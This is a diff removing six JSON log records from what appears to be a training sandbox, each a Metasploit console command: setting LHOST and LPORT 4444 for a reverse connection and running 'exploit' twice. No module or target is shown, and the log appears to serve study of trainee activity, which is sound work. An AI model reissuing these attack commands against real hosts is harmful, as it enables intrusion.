@@ -1,6 +1,0 @@
-{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:58:42.050124+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 100.100.100.2"}
-{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:58:47.455654+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:58:55.265011+02:00", "cmd_type": "msf-command", "cmd": "set LPORT "}
-{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:58:58.974444+02:00", "cmd_type": "msf-command", "cmd": "set LPORT 4444"}
-{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:59:05.425225+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "84", "timestamp_str": "2020-07-15T09:59:35.977302+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
